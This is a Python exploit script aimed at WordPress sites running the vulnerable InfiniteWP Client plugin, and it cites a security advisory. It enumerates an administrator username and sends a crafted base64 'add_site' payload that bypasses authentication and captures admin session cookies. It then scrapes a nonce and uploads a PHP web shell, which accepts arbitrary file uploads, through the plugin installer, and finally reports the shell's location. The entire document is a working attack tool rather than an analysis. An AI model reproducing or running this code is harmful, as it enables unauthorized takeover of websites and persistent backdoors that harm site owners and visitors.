## Reference: https://www.webarxsecurity.com/vulnerability-infinitewp-client-wp-time-capsule/
## Created By Rintod.DEV

#!/usr/bin/env python3
import requests
import re
import json
import base64
import sys
import datetime
from termcolor import colored
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class iWP_rintodDotDEV:

    def __init__(self, url):
        self.url = url
        self.username = None
        self.vuln = False
        self.cookies = None
        self.nonce = None
        self.headers = None
        self.verify = False
        self.shell = "rintodDotDEV.php"
        self.month = datetime.datetime.now().strftime("%m")
        self.year = datetime.datetime.now().strftime("%Y")

    def Enumeration(self):
        try:
            r = requests.get(self.url + "/?author=1", verify=False, allow_redirects=False)
            if r.status_code == 301:
                if "/author/" in r.headers:
                    catch = re.findall(r"/author/(.*?)/", r.headers["Location"])[0]
                    self.username = catch
                    return True
                else:
                    res = requests.get(self.url + "/wp-json/wp/v2/users", verify=False)
                    if res.status_code == 200 and "slug" in res.text:
                        joke = json.loads(res.text)
                        self.username = str(joke[0]["slug"])
                        return True
                    else:
                        return False
            else:
                res = requests.get(self.url + "/wp-json/wp/v2/users", verify=False)
                if res.status_code == 200 and "slug" in res.text:
                    joke = json.loads(res.text)
                    self.username = str(joke[0]["slug"])
                    return True
                else:
                    return False
        except Exception as e:
            print(str(e))

    def Payload(self):
        payload = base64.b64encode(json.dumps({
            "iwp_action": "add_site",
            "id": 1,
            "params": {
                "username": self.username
            }
        }).encode())
        self.payload = "_IWP_JSON_PREFIX_%s" % (payload.decode())

    def Headers(self):
        self.headers = {
            "User-Agent": "Mozilla",
            "Cookie": self.cookies
        }
    def Test(self):
        try:
            r = requests.post(self.url, data=self.payload, verify=False)
            if "<IWPHEADER>" in r.text:
                cookies = r.headers["set-cookie"]
                self.cookies = re.sub("path=.*?; HttpOnly", "", cookies).replace(",", "").replace("  ", " ")
                self.Headers()
                self.vuln = True
            else:
                self.vuln = False
        except Exception as e:
            print(str(e))

    def Check(self):
        try:
            r = requests.get(self.url + "/wp-content/uploads/" + self.year + "/" + self.month + "/" + self.shell, verify=False)
            if r.status_code == 200 and "rintodDotDEV":
                return True
            else:
                return False
        except Exception as e:
            print(str(r))

    def Upload(self):
        try:
            sc = """
            <?php 
            if (isset($_FILES['rintodDotDEV']['name']))
            {
                $name = $_FILES['rintodDotDEV']['name'];
                $rintod = $_FILES['rintodDotDEV']['tmp_name'];
                @move_uploaded_file($rintod, $name);
                echo $name;
            }
            else
            {
                echo "<form method=post enctype=multipart/form-data><input type=file name=rintodDotDEV><input type=submit value='>>'>";
            }
            ?>
            """
            fileHandler = {
                "_wpnonce": (None, self.nonce, None),
                "_wp_http_referer": (None, self.url + "/wp-admin/plugin-install.php?tab=upload", None),
                "pluginzip": (self.shell, sc, "text/plain"),
                "install-plugin-submit": (None, "Install Now", None)
            }
            r = requests.post(self.url + "/wp-admin/update.php?action=upload-plugin", headers=self.headers, files=fileHandler, verify=False)
            if r.status_code == 200:
                return True
            else:
                return False
        except Exception as e:
            print(str(e))    
    def Nonce(self):
        try:
            r = requests.get(self.url + "/wp-admin/plugin-install.php?tab=upload", headers=self.headers, verify=False)
            if "name=\"_wpnonce\"" in r.text:
                self.nonce = re.findall(r"name=\"_wpnonce\" value=\"(.*?)\"", r.text)[0]
            else:
                self.nonce = None
        except Exception as e:
            print(str(e))

    def Verify(self):
        try:
            r = requests.get(self.url + "/wp-admin/plugin-install.php", headers=self.headers, verify=False)
            if "plugin-install-featured" in r.text:
                self.verify = True
            else:
                self.verify = False
        except Exception as e:
            print(str(e))

    def Exploit(self):
        try:
            print(colored("Targeting %s" % (self.url), "blue"))
            if self.Enumeration():
                print(colored("Get User Ok : %s" % (self.username), "green"))
                self.Payload()
                self.Test()
                if self.vuln:
                    print(colored("Target is vuln", "green"))
                    print(colored("Verify Login", "yellow"))
                    self.Verify()
                    if self.verify:
                        print(colored("Login Success", "green"))
                        print(colored("Get Nonce", "blue"))
                        self.Nonce()
                        if self.nonce is not None:
                            print(colored("Nonce OK", "green"))
                            print(colored("Uploading Shell ...", "blue"))
                            if self.Upload():
                                print(colored("Upload Shell OK", "green"))
                                print(colored("Checking Shell ...", "blue"))
                                if self.Check():
                                    print(colored("Shell ... " + self.url + "/wp-content/uploads/" + self.year + "/" + self.month + "/" + self.shell, "green"))
                                else:
                                    print(colored("Shell ... BAD", "red"))
                                    print(colored("Try Manual!", "yellow"))
                                    print(colored(self.cookies, "blue"))
                            else:
                                print(colored("Upload Shell Failed", "red"))
                        else:
                            print(colored("Nonce Bad", "red"))
                    else:
                        print(colored("Login Failed", "red"))
                else:
                    print(colored("Target Not Vuln", "red"))
            else:
                print(colored("Cant get user", "red"))
        except Exception as e:
            print(str(e))



if __name__ == "__main__":
    oi = iWP_rintodDotDEV(sys.argv[1])
    oi.Exploit()
